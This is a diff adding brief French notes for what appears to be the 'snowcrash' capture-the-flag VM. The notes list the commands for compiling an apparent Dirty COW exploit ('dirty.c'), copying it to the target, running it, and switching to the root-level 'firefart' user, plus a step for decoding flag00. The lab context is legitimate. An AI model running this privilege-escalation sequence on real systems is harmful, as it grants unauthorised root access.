@@ -1,0 +1,19 @@
+>> Pour le root
+
+[host]
+gcc -m32 -static -pthread dirty.c -o dirty -lcrypt
+scp -P 4242 dirty level00@192.168.1.16:/tmp/hehe
+
+[snowcrash]
+chmod +x /tmp/hehe
+/tmp/./hehe
+su firefart
+
+
+>> Pour le flag00
+
+[snowcrash]
+cat /usr/sbin/john
+
+[host]
+python3 caesar.py
